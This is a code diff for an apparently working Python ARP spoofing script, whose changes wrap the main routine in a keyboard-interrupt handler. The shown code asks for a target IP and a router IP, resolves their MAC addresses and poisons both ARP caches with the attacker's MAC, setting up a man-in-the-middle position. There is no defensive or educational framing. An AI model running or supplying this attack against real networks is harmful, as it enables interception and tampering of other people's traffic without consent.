@@ -19,17 +19,18 @@ def arpSpoofing(targetIP, spoofIP, targetMAC, spoofMAC):
         time.sleep(2)  
 
 if __name__ == "__main__":
-    
-    targetIP = input(f"{terminalColors.TerminalColors.OKGREEN}Enter target IP: {terminalColors.TerminalColors.END}")
-    routerIP = input(f"{terminalColors.TerminalColors.OKGREEN}Enter router IP: {terminalColors.TerminalColors.END}")  
-    attackMAC = get_if_hwaddr(conf.iface)
-    
-    targetMAC = findMac(targetIP)
-    routerMAC = findMac(routerIP)
-    
-    print(f"{terminalColors.TerminalColors.OKBLUE}Target MAC: {targetMAC}{terminalColors.TerminalColors.END}")
-    print(f"{terminalColors.TerminalColors.OKBLUE}Router MAC: {routerMAC}{terminalColors.TerminalColors.END}")
-    
-    arpSpoofing(targetIP, routerIP, targetMAC, attackMAC)  
-    arpSpoofing(routerIP, targetIP, routerMAC, attackMAC)  
-
+    try:
+        targetIP = input(f"{terminalColors.TerminalColors.OKGREEN}Enter target IP: {terminalColors.TerminalColors.END}")
+        routerIP = input(f"{terminalColors.TerminalColors.OKGREEN}Enter router IP: {terminalColors.TerminalColors.END}")  
+        attackMAC = get_if_hwaddr(conf.iface)
+        
+        targetMAC = findMac(targetIP)
+        routerMAC = findMac(routerIP)
+        
+        print(f"{terminalColors.TerminalColors.OKBLUE}Target MAC: {targetMAC}{terminalColors.TerminalColors.END}")
+        print(f"{terminalColors.TerminalColors.OKBLUE}Router MAC: {routerMAC}{terminalColors.TerminalColors.END}")
+        
+        arpSpoofing(targetIP, routerIP, targetMAC, attackMAC)
+        arpSpoofing(routerIP, targetIP, routerMAC, attackMAC)
+    except KeyboardInterrupt:
+        print("ARP spoofing stopped.")
